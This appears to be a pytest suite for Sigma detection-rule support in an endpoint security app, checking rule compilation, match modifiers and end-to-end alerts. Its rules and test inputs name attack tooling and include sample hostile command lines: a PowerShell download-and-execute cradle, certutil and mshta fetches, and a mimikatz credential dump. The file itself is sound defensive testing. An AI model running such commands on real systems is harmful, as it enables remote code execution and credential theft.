"""Tests for Sigma rule support (v1.3)."""
import pytest

from app.detection.rules import EventContext
from app.detection.sigma import (SigmaError, compile_sigma, validate_sigma)
from app.services import auth_service
from tests.conftest import ADMIN_HEADERS

PS_RULE = """
title: Suspicious PowerShell Encoded Command
id: ps-enc-1
level: high
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - '-enc'
      - 'downloadstring'
  condition: selection
"""


@pytest.fixture(autouse=True)
def _reset_rate_limit():
    auth_service.reset_rate_limit()
    yield
    auth_service.reset_rate_limit()


def _ctx(command_line, **details):
    details["command_line"] = command_line
    return EventContext("process", "exec", "info", "", details)


# -- compile / match unit tests -------------------------------------------
def test_compile_extracts_metadata():
    c = compile_sigma(PS_RULE)
    assert c.name.startswith("Suspicious PowerShell")
    assert c.severity == "high"
    assert c.technique_id == "T1059.001"
    assert c.rule_id == "ps-enc-1"


def test_contains_modifier_matches():
    c = compile_sigma(PS_RULE)
    assert c.matches(_ctx("powershell -nop -enc SQBFAFgA"))
    assert c.matches(_ctx("powershell iex (New-Object Net.WebClient).downloadstring('http://x')"))
    assert not c.matches(_ctx("powershell Get-Process"))


def test_and_condition_requires_all_selections():
    rule = """
title: PS + Network
detection:
  sel_ps:
    Image|contains: powershell
  sel_net:
    CommandLine|contains: downloadstring
  condition: sel_ps and sel_net
"""
    c = compile_sigma(rule)
    assert c.matches(_ctx("powershell downloadstring http://x"))
    assert not c.matches(_ctx("powershell Get-Help"))


def test_one_of_them_condition():
    rule = """
title: Any LOLBin
detection:
  a:
    CommandLine|contains: certutil
  b:
    CommandLine|contains: mshta
  condition: 1 of them
"""
    c = compile_sigma(rule)
    assert c.matches(_ctx("certutil -urlcache -f http://x"))
    assert c.matches(_ctx("mshta http://x"))
    assert not c.matches(_ctx("notepad.exe"))


def test_not_condition():
    rule = """
title: PS but not allowed
detection:
  sel:
    Image|contains: powershell
  allowed:
    CommandLine|contains: get-help
  condition: sel and not allowed
"""
    c = compile_sigma(rule)
    assert c.matches(_ctx("powershell -enc AAAA"))
    assert not c.matches(_ctx("powershell get-help"))


def test_keyword_list_selection():
    rule = """
title: Keywords
detection:
  keywords:
    - mimikatz
    - sekurlsa
  condition: keywords
"""
    c = compile_sigma(rule)
    assert c.matches(_ctx("c:\\\\tools\\\\mimikatz.exe sekurlsa::logonpasswords"))
    assert not c.matches(_ctx("explorer.exe"))


def test_endswith_and_regex_modifiers():
    rule = """
title: Modifiers
detection:
  a:
    Image|endswith: /evil.exe
  b:
    CommandLine|re: 'http://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'
  condition: a or b
"""
    c = compile_sigma(rule)
    assert c.matches(_ctx("/tmp/evil.exe"))
    assert c.matches(_ctx("curl http://10.0.0.5/x"))
    assert not c.matches(_ctx("curl http://example.com"))


def test_invalid_sigma_raises():
    with pytest.raises(SigmaError):
        compile_sigma("title: no detection block")
    with pytest.raises(SigmaError):
        validate_sigma(":: not yaml : [")


# -- end-to-end via telemetry ingestion -----------------------------------
def _add_sigma(client, name, content):
    r = client.post("/api/admin/intel/rules", headers=ADMIN_HEADERS,
                    json={"kind": "sigma", "name": name, "content": content, "enabled": True})
    assert r.status_code == 201, r.text
    return r.json()


def test_sigma_rule_creates_detection_end_to_end(client, enrolled_device):
    _add_sigma(client, "ps-enc", PS_RULE)
    client.post("/api/agent/telemetry", json={"events": [
        {"source": "process", "action": "exec", "severity": "info",
         "summary": "Process started: powershell",
         "details": {"pid": 10, "name": "powershell",
                     "command_line": "powershell -nop -enc SQBFAFgA"}},
    ]}, headers=enrolled_device["headers"])
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    sigma_hits = [d for d in dets if d["rule_id"] == "sigma:ps-enc-1"]
    assert len(sigma_hits) == 1
    assert sigma_hits[0]["severity"] == "high"
    assert sigma_hits[0]["technique_id"] == "T1059.001"


def test_invalid_sigma_rejected_at_ingestion(client):
    r = client.post("/api/admin/intel/rules", headers=ADMIN_HEADERS,
                    json={"kind": "sigma", "name": "bad", "content": "title: x", "enabled": True})
    assert r.status_code == 400
    assert "invalid Sigma" in r.json()["detail"]


def test_disabled_sigma_rule_does_not_fire(client, enrolled_device):
    r = client.post("/api/admin/intel/rules", headers=ADMIN_HEADERS,
                    json={"kind": "sigma", "name": "ps-off", "content": PS_RULE, "enabled": False})
    assert r.status_code == 201
    client.post("/api/agent/telemetry", json={"events": [
        {"source": "process", "action": "exec", "severity": "info", "summary": "ps",
         "details": {"command_line": "powershell -enc SQBFAFgA"}},
    ]}, headers=enrolled_device["headers"])
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    assert not any(d["rule_id"].startswith("sigma:") for d in dets)
